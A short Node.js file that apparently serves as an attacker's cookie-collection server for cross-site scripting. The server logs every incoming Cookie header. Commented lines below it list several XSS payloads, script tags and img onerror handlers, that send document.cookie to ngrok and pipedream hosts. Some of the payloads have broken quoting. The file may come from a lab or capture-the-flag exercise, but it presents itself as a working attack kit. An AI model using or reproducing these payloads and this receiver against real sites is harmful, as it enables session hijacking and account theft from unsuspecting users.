const http = require('http');
const dotenv = require('dotenv');

dotenv.config();

const hostname = process.env.IPV4;
const port = 3000;

const server = http.createServer((req, res) => {
    console.log('Cookie reçu :', req.headers.cookie);
    res.end('OK');
});
server.listen(port, hostname, () => {
    console.log(`Server running at http://${hostname}:${port}`);
});


// <script>fetch(`https://1059d18f2984.ngrok-free.app?cookie=${encodeURIComponent(document.cookie)}`);</script>
// <script>fetch(`https://1059d18f2984.ngrok-free.app/?cookie="` + document.cookie()</script>
// <script>console.log("XSS");fetch("https://1059d18f2984.ngrok-free.app/?cookie="" + encodeURIComponent(document.cookie));</script>
// <img src=x onerror="fetch('https://1059d18f2984.ngrok-free.app/?cookie="' + encodeURIComponent(document.cookie))">
// <img src=x onerror="console.log('XSS déclenché'); fetch('https://eoz0v6yk9lohja8.m.pipedream.net/?cookie=' + encodeURIComponent(document.cookie))">


